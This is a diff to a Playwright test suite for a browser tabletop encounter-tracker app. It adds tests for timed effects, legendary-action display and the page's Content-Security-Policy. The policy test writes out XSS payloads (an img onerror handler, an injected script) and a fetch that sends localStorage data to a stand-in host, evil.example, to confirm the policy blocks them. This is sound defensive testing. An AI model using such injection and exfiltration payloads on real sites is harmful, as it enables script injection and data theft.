@@ -65,8 +65,10 @@ class AppDidNotLoad(Exception):
 
 
 class App:
-    def __init__(self, browser, w=1366, h=900, query=""):
-        self.ctx = browser.new_context(viewport={"width": w, "height": h}, accept_downloads=True)
+    def __init__(self, browser, w=1366, h=900, query="", csp=False):
+        # The page's security policy forbids eval, which window.__e (below) needs, so tests switch the policy off;
+        # csp=True keeps it on (security_policy_holds): that test talks to the page with self.pg.evaluate() only.
+        self.ctx = browser.new_context(viewport={"width": w, "height": h}, accept_downloads=True, bypass_csp=not csp)
         self.ctx.set_default_timeout(8000)  # a missing control fails in 8 s, not 30
         self.pg = self.ctx.new_page()
         self.errors = []
@@ -84,7 +86,7 @@ class App:
                                      "localStorage.setItem('encounter-tracker-monsters'," + json.dumps(json.dumps([f])) + ");}")
         self.pg.goto(URL + query)
         try:
-            self.pg.wait_for_function("window.STARTED === true", timeout=15000)
+            self.pg.wait_for_function("() => window.STARTED === true", timeout=15000)
         except Exception:
             raise AppDidNotLoad("the app did not start: " + ("; ".join(self.errors[:3]) or "no error reported"))
 
@@ -1979,14 +1981,16 @@ def your_file_by_link(b):
         a.click('[data-act="openadd"]'); a.e("S.tab='data';S.dsec='src';renderDrawer()")
 
     a = App(b)
-    for pat in ("https://files.example/**", "https://www.googleapis.com/**", "https://dl.dropboxusercontent.com/**"):
+    for pat in ("https://gist.githubusercontent.com/**", "https://www.googleapis.com/**", "https://dl.dropboxusercontent.com/**"):
         a.ctx.route(pat, serve)
     n = a.e("MON.length"); open_src(a)
     a.pg.fill("#monurl", "not a link"); a.click('[data-act="addmonlink"]')
     check("not a link" in a.pg.inner_text("#drawer") and a.e("CUSTOM.length") == 0, "a non-link is refused")
     a.pg.fill("#monurl", "https://drive.google.com/file/d/1AbCdEfGhIjKlMnOp/view?usp=sharing"); a.click('[data-act="addmonlink"]')
     check("needs a Google API key" in a.pg.inner_text("#drawer"), "a Drive link without a key says what is missing")
-    a.pg.fill("#monurl", "https://files.example/denied/book.json"); a.click('[data-act="addmonlink"]')
+    a.pg.fill("#monurl", "https://files.example/my/book.json"); a.click('[data-act="addmonlink"]')
+    check("only read from Dropbox" in a.pg.inner_text("#drawer") and a.e("CUSTOM.length") == 0, "a host outside the security policy is refused with the reason")
+    a.pg.fill("#monurl", "https://gist.githubusercontent.com/denied/book.json"); a.click('[data-act="addmonlink"]')
     a.pg.wait_for_function("window.__e('String(FNOTE && FNOTE.t)').indexOf('Could not read') === 0")
     a.errors.clear()                                       # the 403 above is the point of that step
     eq(a.e("CUSTOM.length"), 0, "a refused link changes nothing")
@@ -1996,12 +2000,12 @@ def your_file_by_link(b):
     note = a.e("FNOTE.t")
     check("not valid" in note and "Google says" in note and "API key not valid" in note, "a bad key is named, with Google's own words: " + note)
     a.errors.clear(); a.pg.fill("#mongkey", "")
-    a.pg.fill("#monurl", "https://files.example/my/book.json")
+    a.pg.fill("#monurl", "https://gist.githubusercontent.com/my/book.json")
     with a.pg.expect_navigation():
         a.click('[data-act="addmonlink"]')
     a.pg.wait_for_function("window.STARTED === true")
     eq(a.j("[MON.length,CUSTOM[0].name,CUSTOM[0].url,CUSTOM[0].monsters.length,CUSTOM[0].spells.length]"),
-       [n + 1, "book.json", "https://files.example/my/book.json", 1, 1], "the linked file is stored and merged")
+       [n + 1, "book.json", "https://gist.githubusercontent.com/my/book.json", 1, 1], "the linked file is stored and merged")
     body["monsters"][0]["hp"] = 30                         # the file changes at its host: Update fetches it again
     open_src(a); check("linked" in a.pg.inner_text("#drawer"), "the list marks it as linked")
     with a.pg.expect_navigation():
@@ -2016,7 +2020,7 @@ def your_file_by_link(b):
     check("https://www.googleapis.com/drive/v3/files/1AbCdEfGhIjKlMnOp?alt=media&key=KEY123" in seen, "Drive is read through its API")
     eq(a.j("CUSTOM.map(function(f){return [f.name,f.key||''];})"), [["book.json", ""], ["drive-book.json", "KEY123"]], "the Drive file keeps its name and key")
     eq(a.e("linkUrl('https://www.dropbox.com/scl/fi/abc/book.json?rlkey=x&dl=0').url"), "https://dl.dropboxusercontent.com/scl/fi/abc/book.json?rlkey=x&dl=0", "Dropbox share link becomes its direct form")
-    check("files.example" not in a.e("JSON.stringify(tableSnap())"), "the link is not sent to other devices")
+    check("githubusercontent" not in a.e("JSON.stringify(tableSnap())"), "the link is not sent to other devices")
     eq(a.errors, [], "no errors:")
 
 
@@ -2089,6 +2093,100 @@ def hostile_or_broken_file_is_harmless(b):
 
 
 @test
+def security_policy_holds(b):
+    # The page carries a Content-Security-Policy (index.html). This is the one test that runs with it switched on:
+    # (1) the app starts and its screens draw without breaking the policy; (2) script written into HTML does not run
+    # and the page cannot talk to a host that is not listed. Other tests switch the policy off (they need eval).
+    a = App(b, csp=True)
+    a.ctx.add_init_script("window.__v=[];document.addEventListener('securitypolicyviolation',function(e){window.__v.push(e.violatedDirective+' '+e.blockedURI);});")
+    a.pg.reload(); a.pg.wait_for_function("() => window.STARTED === true")
+    ev = a.pg.evaluate
+    check("script-src 'self'" in ev("document.querySelector('meta[http-equiv=Content-Security-Policy]').content"), "the policy is on the page")
+    ev("(function(){var m=MON.find(function(x){return (x.leg||[]).length;});addMon(m.id,1);S.lib.push({id:'l1',name:'Hero',ac:15,hp:20,ib:2});addPc(S.lib[0]);"
+       "S.list[0].init=20;S.list[1].init=10;S.list.push({id:S.next++,kind:'fx',name:'Gas',desc:'',init:5,vis:true,ac:0,hp:0,max:0,temp:0,conds:[],cr:'',spent:{},dd:'2d6',dt:'poison',sv:'2',dc:13,st:'Poisoned',dur:''});"
+       "save();renderAll();})()")
+    a.click('[data-act="next"]'); a.click('[data-act="next"]')
+    ev("(function(){ui.drawer=true;ui.dmode='add';['stat','add','edit','ref','def','data'].forEach(function(t){S.tab=t;"
+       "(t==='add'?['monsters','party','effects']:[0]).forEach(function(s){if(s)S.sub=s;(t==='data'?['enc','sess','src','bak']:[0]).forEach(function(d){if(d)S.dsec=d;ui.sel={};ui.sel[S.list[0].id]=true;renderAll();});});});})()")
+    a.pg.wait_for_timeout(300)
+    check(not a.pg.query_selector("#drawer img.thumb"), "a missing stat block picture still removes itself")
+    ev("new Promise(function(ok,no){var s=document.createElement('script');s.src='supabase.js';s.onload=ok;s.onerror=no;document.head.appendChild(s);})")
+    check(ev("!!window.supabase"), "the remote-session library loads under the policy")
+    eq(ev("window.__v"), [], "nothing the app does breaks the policy")
+    eq(a.errors, [], "no errors:")
+    # now the attacks the policy is there for
+    ev("document.body.insertAdjacentHTML('beforeend','<img src=\"x-missing.png\" onerror=\"window.PWNED=1\">')")
+    ev("(function(){var s=document.createElement('script');s.textContent='window.PWNED2=1';document.body.appendChild(s);})()")
+    sent = ev("fetch('https://evil.example/?d='+encodeURIComponent(localStorage.length)).then(function(){return 'sent';},function(){return 'blocked';})")
+    a.pg.wait_for_timeout(300)
+    eq((ev("window.PWNED||0"), ev("window.PWNED2||0"), sent), (0, 0, "blocked"), "script in HTML does not run and an unlisted host is unreachable")
+    v = " | ".join(ev("window.__v"))
+    check("script-src" in v and "connect-src" in v, "the browser reports both as blocked: " + v)
+
+
+@test
+def effect_after_n_rounds(b):
+    # A timed effect: "Starts in round" keeps it out of the order (and off the players' screens) until that round;
+    # "Lasts rounds" ends it by itself one round after its last turn, together with its "1 round" statuses.
+    a = App(b)
+    p = a.pc("Hero"); q = a.pc("Mage")
+    a.e(f"findC({p}).init=15;findC({q}).init=10;renderAll()")
+    a.e("ui.drawer=true;S.tab='add';S.sub='effects';renderDrawer()")
+    a.pg.fill('#fxname', 'Gas'); a.pg.fill('#fxinit', '20'); a.pg.fill('#fxfrom', '2'); a.pg.fill('#fxlast', '2')
+    a.pg.select_option('#fxst', 'Poisoned'); a.pg.select_option('#fxdur', 'fx')
+    a.click('[data-act="addfx"]')
+    fx = a.j("S.list.find(function(c){return c.kind==='fx';})")
+    eq((fx["from"], fx["last"]), (2, 2), "the form stores both numbers")
+    eq(a.e("ui.fx.from+ui.fx.last"), "", "the form is cleared")
+    seen = (a.pg.inner_text('#strip') + " | " + a.pg.inner_text('#tbl')).lower()
+    eq(seen.count("starts in round 2"), 2, "the DM sees when it starts (strip and table): " + seen)
+    check(not any(c["kind"] == "fx" for c in a.j("tableSnap().list")), "players do not see it before it starts")
+    turns = []
+    def nxt():
+        a.click('[data-act="next"]'); turns.append((a.e("S.round"), a.e("findC(S.turnId).name")))
+    nxt(); nxt()
+    eq(turns, [(1, "Hero"), (1, "Mage")], "round 1 passes without the effect")
+    nxt()
+    eq(turns[-1], (2, "Gas"), "it acts first in round 2")
+    eq(a.c(fx["id"]).get("until"), 3, "two rounds: 2 and 3")
+    check(any(c["kind"] == "fx" for c in a.j("tableSnap().list")), "players see it once it has started")
+    check("until round 3" in a.pg.inner_text('#turn'), "the turn card says how long")
+    a.click('[data-act="fxgo"]'); a.select(p); a.pad("dmg", 0)
+    check("Poisoned" in a.c(p)["conds"], "its status is applied")
+    nxt(); nxt(); nxt()
+    eq(turns[-1], (3, "Gas"), "it acts again in round 3")
+    check("Poisoned" not in a.c(p)["conds"], "the 1-round status ended when it acted again")
+    a.click('[data-act="fxgo"]'); a.select(p); a.pad("dmg", 0)
+    nxt(); nxt(); nxt()
+    eq(turns[-1], (4, "Hero"), "in round 4 it is skipped")
+    check(not a.j("S.list.filter(function(c){return c.kind==='fx';})"), "and has ended by itself")
+    check("Poisoned" not in a.c(p)["conds"], "taking its 1-round status with it")
+    a.click('[data-act="undo"]')
+    check(a.j("S.list.filter(function(c){return c.kind==='fx';})") and a.e("findC(S.turnId).name") == "Mage", "Undo brings it back")
+    a.e("ui.drawer=true;S.tab='add';S.sub='effects';renderDrawer()")   # no numbers: acts every round, as before
+    a.pg.fill('#fxname', 'Lair'); a.pg.fill('#fxinit', '12'); a.click('[data-act="addfx"]')
+    eq(a.e("fxWhen(S.list[S.list.length-1])"), "", "an effect without numbers has no timing")
+    eq(a.errors, [], "errors:")
+
+
+@test
+@test_book
+def turn_card_lists_legendary_once(b):
+    # Legendary actions are used from the bar on other creatures' turns; the monster's own turn card no longer repeats them.
+    a = App(b)
+    d = a.e("MON.find(function(m){return (m.leg||[]).length && (m.traits||[]).length}).id")
+    m = a.mon(d)[0]; p = a.pc("Hero"); q = a.pc("Mage")
+    a.e(f"findC({m}).init=20;findC({p}).init=15;findC({q}).init=10;renderBoard()")
+    a.click('[data-act="next"]')
+    t = a.pg.inner_text('#turn details summary')
+    check(t.startswith("Traits (") and "legendary" not in t.lower(), "the fold is traits only: " + t)
+    eq(a.e("document.querySelectorAll('#turn details > *').length - 1"), a.e(f"MON.find(function(x){{return x.id==='{d}'}}).traits.length"), "one entry per trait, none for legendary actions")
+    a.click('[data-act="next"]'); a.click('[data-act="next"]')
+    check(a.pg.query_selector('#turn .legr [data-act="lact"], #turn .legr [data-act="laspend"]'), "the legendary bar is still there on other creatures' turns")
+    eq(a.errors, [], "errors:")
+
+
+@test
 @test_book
 def own_file_end_to_end(b):
     # The real upgrade path: a device with saved fights that use stat blocks which are not built in. The app must keep
@@ -2151,8 +2249,8 @@ def file_status_is_visible(b):
         a.e("ui.drawer=true;S.tab='data';S.dsec='src';renderAll()")
     open_src(a)
     check("No files on this device" in a.pg.inner_text("#drawer"), "an empty list says only built-in data is loaded")
-    a.pg.fill("#monurl", "https://files.example/my/book.json"); a.e("renderAll()")
-    eq(a.pg.input_value("#monurl"), "https://files.example/my/book.json", "a typed link survives a redraw")
+    a.pg.fill("#monurl", "https://gist.githubusercontent.com/my/book.json"); a.e("renderAll()")
+    eq(a.pg.input_value("#monurl"), "https://gist.githubusercontent.com/my/book.json", "a typed link survives a redraw")
     a.pg.fill("#monurl", "not a link"); a.click('[data-act="addmonlink"]')
     note = a.pg.inner_text("#drawer .fnote.bad")
     check("Not loaded" in note and "not a link" in note, "a failure is reported inside the card: " + note)
